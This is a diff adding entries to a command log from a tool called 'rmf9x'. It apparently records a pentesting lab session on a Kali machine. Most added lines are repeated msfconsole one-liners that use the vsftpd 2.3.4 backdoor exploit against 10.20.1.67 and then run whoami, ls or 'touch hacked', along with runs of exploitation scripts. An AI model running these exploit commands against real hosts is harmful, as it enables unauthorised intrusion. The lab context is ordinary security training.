@@ -21,3 +21,97 @@ INFO:root:rmf9x initialized - 2022-01-30 20:56:35.629180
 INFO:root:rmf9x initialized - 2022-01-30 21:14:22.670285
 INFO:root:cmd 'python3 tests/test.1.py' success 2022-01-30 21:14:34.586559
 INFO:root:cmd 'python3 tests/test.1.py' success 2022-01-30 21:16:10.729577
+INFO:root:rmf9x initialized - 2022-02-02 19:10:09.737025
+INFO:root:cmd 'python3 tests/test.1.py' success 2022-02-02 19:10:36.221640
+ERROR:root:cmd 'python3 tests/test.2.py' error: Command 'python3 tests/test.2.py' returned non-zero exit status 2.  2022-02-02 19:10:56.068360
+INFO:root:cmd 'cd ..' success 2022-02-02 19:11:41.042500
+ERROR:root:cmd 'exit()' error: Command 'exit()' returned non-zero exit status 2.  2022-02-02 19:11:49.503173
+INFO:root:rmf9x initialized - 2022-02-02 19:52:19.861491
+INFO:root:rmf9x initialized - 2022-02-14 16:28:35.249201
+INFO:root:rmf9x initialized - 2022-02-14 16:36:36.055130
+INFO:root:cmd 'ls' success 2022-02-14 16:36:47.015955
+ERROR:root:cmd 'cd ~/Desktop/TeamZephyr/pentesting_scripts' error: Command 'cd ~/Desktop/TeamZephyr/pentesting_scripts' returned non-zero exit status 2.  2022-02-14 16:37:26.547121
+INFO:root:cmd 'ls' success 2022-02-14 16:37:29.313490
+INFO:root:cmd 'ls' success 2022-02-14 16:37:32.848094
+INFO:root:cmd 'cd ~' success 2022-02-14 16:37:47.436481
+INFO:root:cmd 'ls' success 2022-02-14 16:37:50.609970
+INFO:root:cmd 'ls' success 2022-02-14 16:38:15.665845
+INFO:root:rmf9x initialized - 2022-02-14 16:40:31.591132
+INFO:root:cmd 'ls' success 2022-02-14 16:40:43.568318
+ERROR:root:cmd 'sudo python3 exploitation_script.py' error: Command 'sudo python3 exploitation_script.py' returned non-zero exit status 1.  2022-02-14 16:41:01.242691
+INFO:root:cmd 'ls' success 2022-02-14 16:41:14.295880
+ERROR:root:cmd 'python3 exploitation_script.py' error: Command 'python3 exploitation_script.py' returned non-zero exit status 1.  2022-02-14 16:41:34.985715
+INFO:root:rmf9x initialized - 2022-02-14 16:49:05.218043
+INFO:root:cmd 'ls' success 2022-02-14 16:49:15.908259
+ERROR:root:cmd 'python3 exploitation_script.py' error: Command 'python3 exploitation_script.py' returned non-zero exit status 1.  2022-02-14 16:49:28.026786
+ERROR:root:cmd 'sudo python3 exploitation_script.py' error: Command 'sudo python3 exploitation_script.py' returned non-zero exit status 1.  2022-02-14 16:49:40.474893
+INFO:root:rmf9x initialized - 2022-02-14 17:02:04.988605
+INFO:root:cmd 'ls' success 2022-02-14 17:02:13.717105
+ERROR:root:cmd 'sudo python3 exploitation_script.py' error: Command 'sudo python3 exploitation_script.py' returned non-zero exit status 1.  2022-02-14 17:02:25.514374
+INFO:root:cmd 'sudo python3 exploitation_script.py &' success 2022-02-14 17:02:41.279421
+INFO:root:rmf9x initialized - 2022-02-14 17:04:36.360229
+INFO:root:cmd 'ls' success 2022-02-14 17:04:56.492853
+ERROR:root:cmd 'sudo python3 exploitation_script.py' error: Command 'sudo python3 exploitation_script.py' returned non-zero exit status 1.  2022-02-14 17:05:14.268016
+INFO:root:rmf9x initialized - 2022-02-14 17:07:09.556517
+INFO:root:cmd 'msfconsole -q -x "sudo python3 exploitation_script.py"' success 2022-02-14 17:10:06.067681
+INFO:root:rmf9x initialized - 2022-02-14 17:11:04.156828
+INFO:root:cmd 'msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor"' success 2022-02-14 17:16:42.352495
+INFO:root:rmf9x initialized - 2022-02-14 17:16:56.671818
+INFO:root:rmf9x initialized - 2022-02-14 17:22:11.208911
+INFO:root:rmf9x initialized - 2022-02-14 17:27:44.252785
+ERROR:root:cmd 'python3 exploitation_script.py' error: Command 'python3 exploitation_script.py' returned non-zero exit status 1.  2022-02-14 17:28:01.631088
+INFO:root:rmf9x initialized - 2022-02-14 17:28:55.408323
+INFO:root:rmf9x initialized - 2022-02-14 17:40:05.882279
+ERROR:root:cmd 'python3 exploitation_script.py' error: Command 'python3 exploitation_script.py' returned non-zero exit status 1.  2022-02-14 17:41:11.186547
+INFO:root:rmf9x initialized - 2022-02-14 18:04:16.607973
+INFO:root:rmf9x initialized - 2022-03-16 22:47:10.115119
+ERROR:root:cmd 'python3 tests/test1.py' error: Command 'python3 tests/test1.py' returned non-zero exit status 2.  2022-03-16 22:47:39.493239
+INFO:root:cmd 'ls tests' success 2022-03-16 22:47:57.432555
+INFO:root:cmd 'python3 tests/test.1.py' success 2022-03-16 22:48:15.212162
+INFO:root:cmd 'python3 tests/test.1.py' success 2022-03-16 22:54:04.364704
+INFO:root:rmf9x initialized - 2022-03-16 22:55:49.355604
+ERROR:root:cmd 'python3 exploitation_script.py' error: Command 'python3 exploitation_script.py' returned non-zero exit status 1.  2022-03-16 22:56:00.273657
+INFO:root:rmf9x initialized - 2022-03-16 22:58:33.604161
+ERROR:root:cmd 'python3 exploitation_script.py' error: name 'os' is not defined  2022-03-16 22:58:46.951136
+INFO:root:rmf9x initialized - 2022-03-16 22:59:07.523231
+INFO:root:cmd 'python3 exploitation_script.py' success 2022-03-16 22:59:30.305178
+INFO:root:rmf9x initialized - 2022-03-16 23:05:09.599533
+INFO:root:rmf9x initialized - 2022-03-16 23:05:39.926896
+INFO:root:cmd 'python3 exploit.py' success 2022-03-16 23:05:48.440225
+INFO:root:rmf9x initialized - 2022-03-16 23:11:44.650377
+INFO:root:cmd 'python3 exploit.py' success 2022-03-16 23:11:53.398883
+INFO:root:rmf9x initialized - 2022-03-16 23:26:09.639058
+INFO:root:rmf9x initialized - 2022-03-16 23:30:06.661044
+INFO:root:rmf9x initialized - 2022-03-16 23:42:04.076209
+INFO:root:rmf9x initialized - 2022-03-16 23:42:32.047084
+INFO:root:cmd 'python3 exploit.py' success 2022-03-16 23:46:14.081532
+INFO:root:cmd 'msfprcd -U password' success 2022-03-16 23:48:08.135872
+INFO:root:cmd 'msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor;set rhost 10.20.1.67; set rport 21; run exploit;touch badfile;exit;exit"' success 2022-03-16 23:52:52.164363
+INFO:root:cmd ' msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor;set rhost 10.20.1.67; set rport 21; run exploit;touch badfile;exit;exit"' success 2022-03-16 23:58:19.265734
+INFO:root:cmd 'msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor;set rhost 10.20.1.67;set rport 21;run exploit;touch badfile;exit;exit"' success 2022-03-16 23:59:40.044923
+INFO:root:cmd 'msfconsole -q -x "use exploit/unix/ftp_vsftpd_234_backdoor;set rhost 10.20.1.67;set report 21;set lhost localhost; run;touch badfile;exit;exit"' success 2022-03-17 00:05:22.347753
+INFO:root:cmd 'ls' success 2022-03-17 00:05:40.946392
+INFO:root:cmd 'msfconsole -q -x "use exploit/unix/ftp_vsftpd_234_backdoor;set rhost 10.20.1.67;set rport 21; set lhost localhost;run;touch badfile;exit;exit"' success 2022-03-17 00:08:49.489183
+INFO:root:cmd 'msfconsole -q -x "use exploit/unix/ftp_vsftpd_234_backdoor;set rhost 10.20.1.67;set rport 21;set lhost localhost;run exploit;whoami"' success 2022-03-17 00:10:48.685209
+INFO:root:cmd 'msfconsole -q -x "use exploit/unix/ftp_vsftpd_234_backdoor;set rhost 10.20.1.67;set rport 21;set lhost localhost;run exploit;touch hacked"' success 2022-03-17 00:21:25.833522
+INFO:root:cmd 'msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor;set rhost 10.20.1.67;set rport 21;set lhost localhost;run;touch hacked"' success 2022-03-17 00:27:23.127041
+INFO:root:cmd 'msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor;set rhost 10.20.1.67;set rport 21;set lhost localhost;run;whoami;touch hacked;exit;exit"' success 2022-03-17 00:30:01.521573
+INFO:root:cmd 'msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor;set rhost 10.20.1.67;set rport 21;set lhost localhost;run;exit;touch badfile;whoami;exit"' success 2022-03-17 00:34:33.562243
+INFO:root:cmd 'msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor;set rhost 10.20.1.67;set rport 21; set lhost localhost;run;whoami"' success 2022-03-17 00:39:53.135068
+INFO:root:cmd 'msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor;set rhost 10.20.1.67;set rport 21;set lhost localhost;run;ls"' success 2022-03-17 00:42:49.517487
+INFO:root:cmd 'msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor;set rhost 10.20.1.67;set rport 21;set lhost localhost;run exploit;ls"' success 2022-03-17 00:49:08.942141
+INFO:root:cmd 'msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor;set rhost 10.20.1.67;set rport 21;run exploit;whoami"' success 2022-03-17 00:58:47.441344
+INFO:root:cmd 'msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor;set rhost 10.20.1.67;set rport 21; run exploit;ls"' success 2022-03-17 01:02:20.452420
+INFO:root:cmd 'msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor;set rhost 10.20.1.67;set rport 21; uname -n"' success 2022-03-17 01:05:29.320884
+INFO:root:cmd 'msfconsole -q -x "use exploit/unix/ftp/vsctpd_234_backdoor;set rhost 10.20.1.67;set rport 21; uname -n"' success 2022-03-17 01:07:01.478617
+INFO:root:rmf9x initialized - 2022-03-17 01:13:25.074309
+INFO:root:cmd 'msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor;set rhost 10.20.1.67;set rport 21;run exploit;ls"' success 2022-03-17 01:15:17.436043
+INFO:root:cmd 'msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor;set rhost 10.20.1.67;set rport 21;run;ls"' success 2022-03-17 01:18:10.645229
+INFO:root:cmd 'msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor;set rhost 10.20.1.67;set rport 21;run;whoami"' success 2022-03-17 01:20:24.847069
+INFO:root:rmf9x initialized - 2022-03-17 01:24:53.731119
+INFO:root:cmd 'python3 ~/Desktop/TeamZephyr/pentesting_scripts/exploitation_script.py' success 2022-03-17 01:25:59.279051
+INFO:root:rmf9x initialized - 2022-03-17 01:27:00.446980
+INFO:root:cmd 'python3 /home/Kali/Desktop/TeamZephyr/pentesting_scripts/exploitation_script.py' success 2022-03-17 01:27:19.444765
+INFO:root:cmd 'python3 /home/kali/Desktop/TeamZephyr/pentesting_scripts/exploitation_script.py' success 2022-03-17 01:28:20.568534
+INFO:root:rmf9x initialized - 2022-03-17 01:29:48.915260
+INFO:root:cmd 'python3 /home/kali/Desktop/TeamZephyr/pentesting_scripts/exploitation_script.py' success 2022-03-17 01:30:08.611806
